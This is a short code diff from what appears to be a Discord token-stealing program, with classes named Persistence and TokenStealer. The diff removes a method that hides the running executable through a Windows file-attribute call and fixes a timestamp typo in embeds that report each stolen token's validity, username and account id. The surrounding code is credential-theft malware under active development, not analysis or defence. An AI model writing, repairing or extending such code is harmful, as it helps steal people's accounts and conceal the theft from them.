@@ -76,14 +76,6 @@ class Persistence:
             except:
                 pass
 
-    @staticmethod
-    def hide_file():
-        if sys.platform == "win32":
-            try:
-                ct.windll.kernel32.SetFileAttributesW(sys.argv[0], 0x02)
-            except:
-                pass
-
 class TokenStealer:
     def __init__(self):
         self.paths = {
@@ -123,7 +115,7 @@ class TokenStealer:
                             embed.add_field(name="Status", value="Valid" if user else "Invalid", inline=True)
                             if user:
                                 embed.add_field(name="User", value=f"{user['username']}#{user['discriminator']} ({user['id']})", inline=False)
-                            embed.set_footer(text=f"{cat.utcnow()} UTC")
+                            embed.set_footer(text=f"{dat.utcnow()} UTC")
                             embeds.append(embed)
                 except: continue
         return embeds
